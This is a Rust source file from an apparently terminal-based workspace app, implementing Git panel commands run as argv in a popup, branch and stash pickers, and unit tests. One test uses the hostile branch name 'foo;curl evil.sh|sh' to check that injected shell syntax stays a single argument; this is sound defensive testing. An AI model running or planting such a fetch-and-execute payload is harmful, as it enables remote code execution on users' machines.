use std::path::PathBuf;

use super::popup::PopupGeometry;
use super::App;
use crate::app::state::{GitPickerKind, GitPickerState, Mode, SelectionListState};
use crate::events::AppEvent;

/// Repository-wide git operations offered by the Git panel's context menu.
///
/// These run as a real command in a floating terminal popup rather than as a captured background
/// subprocess: `fetch`/`pull`/`push` can prompt for credentials or report merge conflicts, and
/// `log` is a pager. A popup gives the user the actual git output and lets them answer prompts,
/// which capturing stdout could not.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum GitRepoCommand {
    Fetch,
    Pull,
    Push,
    Log,
    StashPush,
}

impl GitRepoCommand {
    /// The argv run inside the popup. `--no-pager` is deliberately omitted for `log`: the pager
    /// is what makes it browsable.
    pub(crate) fn argv(self) -> Vec<String> {
        let args: &[&str] = match self {
            Self::Fetch => &["git", "fetch", "--all", "--prune"],
            Self::Pull => &["git", "pull"],
            Self::Push => &["git", "push"],
            Self::Log => &[
                "git",
                "log",
                "--oneline",
                "--graph",
                "--decorate",
                "-n",
                "200",
            ],
            Self::StashPush => &["git", "stash", "push"],
        };
        args.iter().map(|arg| (*arg).to_string()).collect()
    }

    pub(crate) fn label(self) -> &'static str {
        match self {
            Self::Fetch => "fetch",
            Self::Pull => "pull",
            Self::Push => "push",
            Self::Log => "log",
            Self::StashPush => "stash",
        }
    }
}

impl App {
    /// Runs a repository-wide git command in a popup, rooted at the Git panel's repository.
    pub(crate) fn run_git_repo_command(&mut self, command: GitRepoCommand) {
        let Some(repo_root) = self.git_panel_repo_root() else {
            self.state.git_sidebar.last_error = Some("no git repository for this space".into());
            return;
        };
        self.run_git_popup(command.argv(), command.label(), repo_root);
    }

    /// Shared popup launcher for git commands, including the ones built at call time (branch
    /// switch, stash apply) that carry a user-chosen argument.
    ///
    /// Deliberately argv rather than a shell command line: branch and stash names come from the
    /// repository, and git refnames may legally contain `;`, `$`, backticks and parentheses. Going
    /// through `sh -c` with those interpolated would be a command-injection hole.
    pub(crate) fn run_git_popup(&mut self, argv: Vec<String>, label: &str, repo_root: PathBuf) {
        if let Err(err) = self.spawn_popup_argv_command(
            &argv,
            Some(repo_root),
            Vec::new(),
            PopupGeometry::default(),
        ) {
            self.state.git_sidebar.last_error = Some(format!("{label} failed to start: {err}"));
            return;
        }
        // Whatever the command did to the working tree should show up as soon as it finishes.
        self.force_git_working_tree_refresh_due();
    }

    /// The repository the Git panel is currently showing, preferring the value the background
    /// refresh already resolved.
    pub(crate) fn git_panel_repo_root(&self) -> Option<PathBuf> {
        self.state
            .git_sidebar
            .target_repo_root
            .clone()
            .or_else(|| self.active_git_repo_root())
    }

    pub(crate) fn open_git_stash_picker(&mut self) {
        self.open_git_picker(GitPickerKind::ApplyStash);
    }

    pub(crate) fn open_git_branch_picker(&mut self) {
        self.open_git_picker(GitPickerKind::SwitchBranch);
    }

    /// Opens the modal picker and loads its entries in the background, so listing a large
    /// repository's branches never blocks the render loop.
    fn open_git_picker(&mut self, kind: GitPickerKind) {
        let Some(repo_root) = self.git_panel_repo_root() else {
            self.state.git_sidebar.last_error = Some("no git repository for this space".into());
            return;
        };

        self.git_picker_generation += 1;
        let generation = self.git_picker_generation;
        self.state.git_picker = Some(GitPickerState {
            kind,
            generation,
            repo_root: repo_root.clone(),
            entries: Vec::new(),
            selected: SelectionListState::new(0),
            loading: true,
            error: None,
        });
        self.state.mode = Mode::GitPicker;

        let event_tx = self.event_tx.clone();
        std::thread::spawn(move || {
            let entries = match kind {
                GitPickerKind::ApplyStash => crate::workspace::git_stash_list(&repo_root),
                GitPickerKind::SwitchBranch | GitPickerKind::DeleteBranch => {
                    crate::workspace::git_branch_list(&repo_root)
                }
            };
            let _ = event_tx.blocking_send(AppEvent::GitPickerEntriesReady {
                generation,
                repo_root,
                entries,
            });
        });
    }

    pub(crate) fn handle_git_picker_entries_ready(
        &mut self,
        generation: u64,
        repo_root: PathBuf,
        entries: Option<Vec<crate::workspace::GitListEntry>>,
    ) {
        let Some(picker) = self.state.git_picker.as_mut() else {
            return;
        };
        // Match on the picker instance, not just the repository: two pickers over the same repo
        // (branches then stashes) would otherwise cross-fill, so Enter could run
        // `git stash pop <branch-name>`.
        if picker.generation != generation || picker.repo_root != repo_root {
            return;
        }

        picker.loading = false;
        match entries {
            Some(entries) => {
                picker.entries = entries;
                picker.selected = SelectionListState::new(0);
            }
            None => picker.error = Some("failed to list git entries".into()),
        }
        self.render_dirty.request_generic();
        self.render_notify.notify_one();
    }

    /// Runs the operation the highlighted picker entry stands for.
    ///
    /// Both run in a popup rather than as a captured subprocess: applying a stash or switching
    /// branches can conflict or refuse on a dirty tree, and the user needs to see git say so.
    pub(crate) fn confirm_git_picker(&mut self) {
        let Some(picker) = self.state.git_picker.take() else {
            return;
        };
        self.state.mode = if self.state.active.is_some() {
            Mode::Terminal
        } else {
            Mode::Navigate
        };

        let Some(entry) = picker.selected_entry() else {
            return;
        };

        let value = entry.value.clone();
        let (argv, label): (Vec<String>, &str) = match picker.kind {
            // `stash pop` rather than `apply`: leaving an applied stash on the stack is a common
            // source of duplicate work later.
            GitPickerKind::ApplyStash => (
                vec!["git".into(), "stash".into(), "pop".into(), value],
                "stash pop",
            ),
            GitPickerKind::SwitchBranch => (vec!["git".into(), "switch".into(), value], "switch"),
            // `-d` refuses to drop a branch that is not merged; the popup shows git's warning
            // instead of silently discarding commits.
            GitPickerKind::DeleteBranch => (
                vec!["git".into(), "branch".into(), "-d".into(), value],
                "branch delete",
            ),
        };
        self.run_git_popup(argv, label, picker.repo_root);
    }

    pub(crate) fn open_git_branch_delete_picker(&mut self) {
        self.open_git_picker(GitPickerKind::DeleteBranch);
    }

    /// Opens the "new branch" text prompt, reusing the shared `name_input` buffer that the rename
    /// dialogs already drive.
    pub(crate) fn open_git_branch_create(&mut self) {
        if self.git_panel_repo_root().is_none() {
            self.state.git_sidebar.last_error = Some("no git repository for this space".into());
            return;
        }
        self.state.name_input.clear();
        self.state.name_input_replace_on_type = false;
        self.state.mode = Mode::GitBranchCreate;
    }

    pub(crate) fn confirm_git_branch_create(&mut self) {
        let name = self.state.name_input.trim().to_string();
        self.close_git_branch_create();
        if name.is_empty() {
            return;
        }
        let Some(repo_root) = self.git_panel_repo_root() else {
            return;
        };
        // `switch -c` creates and checks out in one step, and reports in the popup if the name is
        // already taken or invalid.
        self.run_git_popup(
            vec!["git".into(), "switch".into(), "-c".into(), name],
            "branch create",
            repo_root,
        );
    }

    pub(crate) fn close_git_branch_create(&mut self) {
        self.state.name_input.clear();
        self.state.mode = if self.state.active.is_some() {
            Mode::Terminal
        } else {
            Mode::Navigate
        };
    }

    pub(crate) fn close_git_picker(&mut self) {
        self.state.git_picker = None;
        self.state.mode = if self.state.active.is_some() {
            Mode::Terminal
        } else {
            Mode::Navigate
        };
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn repo_commands_are_argv_not_shell_strings() {
        assert_eq!(
            GitRepoCommand::Fetch.argv(),
            vec!["git", "fetch", "--all", "--prune"]
        );
        assert_eq!(GitRepoCommand::Pull.argv(), vec!["git", "pull"]);
        assert_eq!(GitRepoCommand::Push.argv(), vec!["git", "push"]);
        assert_eq!(GitRepoCommand::Log.argv()[..2], ["git", "log"]);
        assert_eq!(
            GitRepoCommand::StashPush.argv(),
            vec!["git", "stash", "push"]
        );
        // Every element must be a single argument: nothing may rely on shell word splitting.
        for command in [
            GitRepoCommand::Fetch,
            GitRepoCommand::Pull,
            GitRepoCommand::Push,
            GitRepoCommand::Log,
            GitRepoCommand::StashPush,
        ] {
            for arg in command.argv() {
                assert!(!arg.contains(' '), "argv element {arg:?} contains a space");
            }
        }
    }

    /// Git refnames may legally contain `;`, `$`, backticks and parentheses. A hostile branch name
    /// must reach git as one argv element, never as shell syntax.
    #[test]
    fn hostile_branch_name_stays_a_single_argument() {
        use crate::app::state::{GitPickerKind, GitPickerState, SelectionListState};
        use crate::workspace::GitListEntry;

        let hostile = "foo;curl evil.sh|sh";
        let picker = GitPickerState {
            kind: GitPickerKind::SwitchBranch,
            generation: 1,
            repo_root: "/repo".into(),
            entries: vec![GitListEntry {
                value: hostile.into(),
                label: hostile.into(),
            }],
            selected: SelectionListState::new(0),
            loading: false,
            error: None,
        };

        let entry = picker.selected_entry().expect("entry");
        let argv: Vec<String> = vec!["git".into(), "switch".into(), entry.value.clone()];

        assert_eq!(argv.len(), 3, "the name must not be split into extra args");
        assert_eq!(argv[2], hostile, "the name is passed through verbatim");
    }

    #[test]
    fn missing_repository_reports_an_error_instead_of_spawning() {
        let mut app = App::new(
            &crate::config::Config::default(),
            true,
            None,
            tokio::sync::mpsc::unbounded_channel().1,
            crate::api::EventHub::default(),
        );

        app.run_git_repo_command(GitRepoCommand::Push);

        assert!(app.state.popup_pane.is_none(), "nothing should be spawned");
        assert!(app.state.git_sidebar.last_error.is_some());
    }
}
